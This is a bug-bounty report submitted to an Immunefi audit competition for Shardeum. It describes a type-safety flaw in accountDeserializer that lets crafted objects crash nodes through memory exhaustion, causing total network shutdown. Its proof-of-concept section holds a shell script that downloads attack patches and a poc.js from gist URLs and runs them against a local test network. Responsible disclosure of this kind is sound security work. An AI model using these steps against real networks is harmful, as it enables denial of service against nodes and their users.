# #39921 \[BC-Critical] accountDeserializer isn't type safe

**Submitted on Feb 10th 2025 at 20:40:11 UTC by @riproprip for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39921
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

`accountDeserializer` allows to serialize plain objects as other object types. This than breaks later assumptions allowing us to allocate memory till the node breaks.

## Vulnerability Details

`accountDeserializer` is not type safe. Attackers can send plain objects mimicking as other objects. Those objects aren't ajv validated like the usual objects. They therefore wreak havoc on deeper functionality. The POC reaches a later `Buffer.from` that expects a string but then receives an Array like object.

Notice how in Reference \[1] the prefix of the stream decides how the stream gets decoded. In the default case an attacker can claim to be of an accountType that is not default. This then is a problem in \[2] when an array like objects get used to instantiate a Buffer.

## Impact Details

Usually just the node process gets killed. In rare cases the OS also kills other processes.

## References

\[1] `https://github.com/shardeum/shardeum/blob/167e48478403918468410dd7562929653d5b9f6b/src/types/Helpers.ts#L110-L113`

\[2] `https://github.com/shardeum/shardeum/blob/167e48478403918468410dd7562929653d5b9f6b/src/state/transactionState.ts#L154`

## Proof of Concept

## Proof of Concept

We are going to:

* use shardus to start 11 nodes.
* Then kill the Port 9011 node.
* start json-rpc-server
* Apply the patches to turn Port 9011 node into an attacking node
* manually start 9011 node
* wait till the node is active
* inject a tx to 9011 node
* wait the \~10 seconds it takes for it to attack other nodes

```
mkdir /tmp/patches/
cd /tmp/patches/
wget "https://gist.githubusercontent.com/cki/b6787af252e8ab089fa06d3e4fddaf16/raw/a1da0ace533ed11343de54d38014f8f1b8d12807/index.patch"
wget "https://gist.githubusercontent.com/cki/48ccc962e692684d5414af2d81550760/raw/4e44063d6ba6e230ad73a3435960d8d84018f71e/dist_genesis.patch"
wget "https://gist.githubusercontent.com/cki/80fb6690227c130c4e6a464af620c717/raw/dc8f919058e988b8137b419a814cc0bcf8f96e38/helpers.patch"
wget "https://gist.githubusercontent.com/cki/a221a5b4471c9260cfe76a9005286c30/raw/ca70467791dae1876bec4f64819f56627ab77470/shardus_index.patch"
wget "https://gist.githubusercontent.com/cki/abec6bb87ddc1f79548b66702e317854/raw/e6810bb9be7fc04e73da41b360afc56a31071926/txqueue.patch"
wget "https://gist.githubusercontent.com/cki/bbd66491b430dbae0ec154a3d20d36fd/raw/c516c891753cee2f756e4bd10d7fae1a29634828/RepairOOSAccountsReq.patch"
wget "https://gist.githubusercontent.com/cki/ce10c0d459b751de2329750c4d4dccc4/raw/013ed97cadb0bd03734452ec0e7fb61d454584dd/WrappedData.patch"
wget "https://gist.githubusercontent.com/cki/f7c5c7c81a8ac14d8e28c2f7175b4e63/raw/ed8151ff9da782b69e22ab2ce300ed644c28bcdb/genesis.patch"
wget "https://gist.githubusercontent.com/cki/82b2c534b76e73422ffc5abd8d35d43a/raw/7cfa962a5a285b62293b83f3b2611554f6949dac/poc.js"
npm install ethers
cd /tmp/shardeum # this is a normal shardeum with "debug-10-nodes.patch" applied
git apply ../patches/genesis.patch
git apply ../patches/dist_genesis.patch
shardus start 11 pm2--no-autorestart
kill PID # take the PID from 9011 port node
cd ../json-rpc-server/; nohup node /tmp/shardeum/dist/src/index.js & # start json rpc server
cd ../shardeum
git apply ../patches/index.patch
git apply ../patches/helpers.patch
git apply ../patches/shardus_index.patch
git apply ../patches/txqueue.patch
git apply ../patches/RepairOOSAccountsReq.patch
git apply ../patches/WrappedData.patch
cd instances/shardus-instance-9011/
nohup node /tmp/shardeum/dist/src/index.js &
sleep 900 # sleep 15 minutes (about the time it takes for the network to be ready)
cd /tmp/shardeum/
node /tmp/patches/poc.js
```
